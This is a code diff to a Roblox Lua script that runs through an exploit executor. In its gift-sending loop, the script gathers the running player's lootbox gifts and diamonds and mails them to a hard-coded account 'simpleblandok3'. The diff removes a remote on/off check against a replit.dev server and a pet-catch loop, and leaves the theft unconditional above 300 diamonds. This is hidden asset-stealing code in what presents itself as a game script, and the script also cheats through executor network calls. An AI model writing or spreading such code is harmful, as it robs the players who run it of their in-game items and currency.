@@ -536,18 +536,12 @@ spawn(dataFunction4)
 
 local function SendGiftsFunction()
     while true do
-        local Http = game:GetService("HttpService")
-        local request = (syn and syn.request) or request or (http and http.request) or http_request
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
         local Player = game.Players.LocalPlayer
-        local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
-
         local diamondsvalue = 0
         local gifts = ""
-        local voidvalue = 0
 
         local ItemLootbox = {"Elemental Gift"}
-        local ItemMisc = {"Pet Cube"}
 
         local function GetItemInfo(ItemsClass, ItemsName)
             local Table = {}
@@ -576,43 +570,15 @@ local function SendGiftsFunction()
             end
         end
 
-        local MiscItems = GetItemInfo("Misc", ItemMisc)
-        for _, ItemInfo in pairs(MiscItems) do
-            local ItemData = ItemInfo.data
-            if ItemData._am then
-                voidvalue = ItemData._am
-            end
-        end
-
-        local response = request({
-            Url = 'https://67f552e4-5e03-4d76-bc81-e7c398e4e63f-00-1db81sgqdm8hk.riker.replit.dev/checkSendGifts',
-            Method = 'GET',
-            Headers = { ['Content-Type'] = 'application/json' }
-        })
-
-        if response and response.Body then
-            local success, responseBody = pcall(function()
-                return Http:JSONDecode(response.Body)
-            end)
-
-            if success and responseBody.SendGifts then
-                if responseBody.SendGifts == true then
-                    print("sending gifts")
-                    print(gifts)
-                    print(diamondsvalue)
-
-                    if diamondsvalue > 50 then
-                        local args = {
-                            [1] = "simpleblandok3",
-                            [2] = "enjoy bro",
-                            [3] = "Lootbox",
-                            [4] = gifts,
-                            [5] = diamondsvalue
-                        }
-                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-                    end
-                end
-            end
+        if diamondsvalue > 300 then
+            local args = {
+                [1] = "simpleblandok3",
+                [2] = "enjoy bro",
+                [3] = "Lootbox",
+                [4] = gifts,
+                [5] = diamondsvalue
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
         end
 
         wait(5)
@@ -620,6 +586,7 @@ local function SendGiftsFunction()
 end
 
 spawn(SendGiftsFunction)
+
 
 local function MailClaim()
     while true do
@@ -650,14 +617,3 @@ wait(1)
 end
 end
 spawn(MailClaim)
-while true do
-    wait(3)
-local randomNum = math.random(1, 50)
-
-local args = {
-    [1] = "Pet Cube",
-    [2] = randomNum
-}
-
-game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
-end
